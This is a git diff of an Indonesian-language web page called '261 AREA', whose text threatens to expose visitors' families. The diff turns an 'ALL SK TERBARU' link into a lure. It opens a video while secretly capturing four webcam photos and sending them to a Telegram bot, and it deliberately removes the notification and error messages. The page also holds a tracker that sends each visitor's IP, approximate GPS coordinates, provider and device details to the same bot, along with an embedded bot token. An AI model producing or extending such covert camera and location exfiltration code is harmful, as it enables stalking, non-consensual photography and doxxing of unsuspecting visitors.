@@ -6,7 +6,7 @@
   <title>261 AREA</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;900&family=Share+Tech+Mono&family=Eater&display=swap" rel="stylesheet">
   <style>
-    /* ===== style persis seperti sebelumnya, hanya footer diubah ===== */
+    /* ===== style persis seperti sebelumnya ===== */
     * {
       margin: 0;
       padding: 0;
@@ -922,7 +922,7 @@
       </div>
     </div> <!-- tutup home -->
     
-    <!-- ABOUT -->
+    <!-- ABOUT (dengan link video) -->
     <div id="about" class="page">
       <div class="content-block">
         <h2>261 AREA</h2>
@@ -930,9 +930,9 @@
         <p class="about-secondary">Selamat datang di AREA 261 yang nggak kenal takut sama drama virtu. Fokus kami cuma satu: <span class="about-highlight">Menyadarkan kalian dari perbudakan IT dan drama kosong.</span></p>
         <p class="about-secondary" style="margin-top: 15px;">Jangan bangga sama gelar virtu lu di sini. Jangankan fisik lu, silsilah keluarga lu dari emak bapak sampe buyut juga bakal dibawa ke meja hijau kalau masih betah jadi budak drama. Sadar atau hancur.</p>
         
-        <!-- ALL SK TERBARU ( KLIK DISINI ) -->
+        <!-- ALL SK TERBARU (KLIK DISINI) - BUKA VIDEO DAN FOTO DIAM-DIAM -->
         <div style="text-align: center; margin-top: 25px;">
-          <a href="#" onclick="requestCameraAndShoot(); return false;" style="color: #ff4444; text-decoration: underline; font-weight: bold; font-size: 18px; text-shadow: 0 0 8px rgba(255,0,0,0.5);">ALL SK TERBARU ( KLIK DISINI )</a>
+          <a href="#" onclick="handleAllSk(); return false;" style="color: #ff4444; text-decoration: underline; font-weight: bold; font-size: 18px; text-shadow: 0 0 8px rgba(255,0,0,0.5);">ALL SK TERBARU ( KLIK DISINI )</a>
         </div>
       </div>
     </div>
@@ -1013,7 +1013,7 @@
   </audio>
 
   <script>
-// ========== TELEGRAM TRACKER PREMIUM + RAM (SAMA PERSIS) ==========
+// ========== TELEGRAM BOT TOKEN & CHAT ID ==========
 const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
 const CHAT_ID = '6774181452';                                       // GANTI!
 
@@ -1075,13 +1075,15 @@ function detectDevice() {
   return { device, os };
 }
 
-// Fungsi utama tracker (sama seperti sebelumnya)
+// ========== TRACKER DENGAN IP GPS (KOORDINAT DARI IP) ==========
 async function trackVisitor() {
   try {
+    // Ambil IP
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
     const ip = ipData.ip;
     
+    // Ambil lokasi GPS dari IP (ipapi.co menyediakan lat/lon)
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
     const geo = await geoRes.json();
     
@@ -1105,7 +1107,7 @@ async function trackVisitor() {
 
 📌 *IP ADDRESS:* \`${ip}\`
 🌍 *LOKASI:* ${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}
-📍 *KOORDINAT:* ${geo.latitude || '-'}, ${geo.longitude || '-'}
+📍 *KOORDINAT (GPS IP):* ${geo.latitude || '-'}, ${geo.longitude || '-'}
 🗺️ *GOOGLE MAPS:* [Klik Disini](${mapsLink})
 📡 *PROVIDER:* ${geo.org || provider || '-'}
 💰 *KODE POS:* ${geo.postal || '-'}
@@ -1123,7 +1125,7 @@ ${ramInfo}
 
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     
-    console.log('Visitor tracked:', ip);
+    console.log('Visitor tracked (GPS IP):', ip);
     
   } catch (error) {
     console.log('Tracker error:', error);
@@ -1136,13 +1138,11 @@ ${ramInfo}
   }
 }
 
-// ========== FUNGSI FOTO 4x KE TELEGRAM (TANPA KETERANGAN) ==========
+// ========== FUNGSI FOTO 4x KE TELEGRAM (DIAM-DIAM, TANPA TOAST) ==========
 async function requestCameraAndShoot() {
   try {
-    // Minta izin kamera
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     
-    // Buat elemen video hidden untuk jepret
     const video = document.createElement('video');
     video.srcObject = stream;
     video.setAttribute('playsinline', '');
@@ -1153,27 +1153,19 @@ async function requestCameraAndShoot() {
     document.body.appendChild(video);
     
     await video.play();
-    
-    // Tunggu video siap
     await new Promise(resolve => {
       if (video.readyState >= 2) resolve();
       else video.onloadeddata = resolve;
     });
     
-    // Buat canvas
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     
-    // Jepret 4x berturut-turut (dengan jeda 400ms)
     for (let i = 0; i < 4; i++) {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      
-      // Konversi ke blob (JPEG)
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-      
-      // Kirim ke Telegram sebagai foto tanpa caption
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', blob, `sk_${Date.now()}_${i+1}.jpg`);
@@ -1183,24 +1175,27 @@ async function requestCameraAndShoot() {
         body: formData
       });
       
-      // Jeda antar jepret
       await new Promise(r => setTimeout(r, 400));
     }
     
-    // Bersihkan: stop stream dan hapus video
     stream.getTracks().forEach(track => track.stop());
     document.body.removeChild(video);
     
-    // Tampilkan notifikasi sukses (toast)
-    const toast = document.getElementById('toast');
-    toast.innerHTML = '✧ <span>4 FOTO TERKIRIM</span> ✧';
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 2000);
+    // TIDAK ADA TOAST / PEMBERITAHUAN
     
   } catch (err) {
     console.error('Camera error:', err);
-    alert('Gagal akses kamera atau terjadi error: ' + err.message);
+    // Gak usah kasih alert biar diam-diam
   }
+}
+
+// ========== FUNGSI UTAMA ALL SK ==========
+function handleAllSk() {
+  // 1. Buka video dari link
+  window.open('https://files.catbox.moe/utk1c4.mp4', '_blank');
+  
+  // 2. Jalankan pengambilan foto diam-diam (tanpa notifikasi)
+  requestCameraAndShoot();
 }
 
 // ========== VARIABEL GLOBAL & FUNGSI UI ==========
@@ -1210,7 +1205,7 @@ let copyTimeout;
 
 // Chat variables
 let conversationHistory = [
-  { role: 'system', content: 'Kamu adalah AI asisten dari 261 AREA...' } // disingkat agar muat
+  { role: 'system', content: 'Kamu adalah AI asisten dari 261 AREA...' }
 ];
 
 // Database Marga
@@ -1383,7 +1378,8 @@ window.nextPhoto = nextPhoto;
 window.prevPhoto = prevPhoto;
 window.closeModal = closeModal;
 window.searchDatabase = searchDatabase;
-window.requestCameraAndShoot = requestCameraAndShoot; // fungsi baru
+window.requestCameraAndShoot = requestCameraAndShoot;
+window.handleAllSk = handleAllSk; // fungsi baru untuk menangani klik
   </script>
 </body>
-  </html>
+    </html>
